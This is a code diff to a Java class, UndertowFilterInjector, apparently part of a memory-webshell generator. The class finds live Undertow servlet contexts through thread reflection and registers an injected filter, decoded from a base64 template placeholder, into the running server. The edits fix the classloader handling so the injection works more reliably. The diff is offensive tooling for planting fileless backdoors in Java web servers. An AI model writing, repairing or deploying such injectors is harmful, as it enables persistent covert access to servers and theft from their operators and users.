@@ -5,7 +5,6 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -47,12 +46,13 @@ public class UndertowFilterInjector {
         return "{{base64Str}}";
     }
 
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
+    public List<Object> getContext() {
         List<Object> contexts = new ArrayList<Object>();
         Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
         for (Thread thread : threads) {
             try {
-                Object requestContext = invokeMethod(thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current", null, null);
+                Class<?> clazz = thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext");
+                Object requestContext = invokeMethod(clazz, "current", null, null);
                 Object servletContext = invokeMethod(requestContext, "getCurrentServletContext", null, null);
                 if (servletContext != null) {
                     contexts.add(servletContext);
@@ -84,7 +84,7 @@ public class UndertowFilterInjector {
         if (isInjected(context)) {
             return;
         }
-        Class<?> filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
+        Class<?> filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo", true, context.getClass().getClassLoader());
         Object deploymentInfo = getFieldValue(context, "deploymentInfo");
         Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(getClassName(), filter.getClass());
         invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
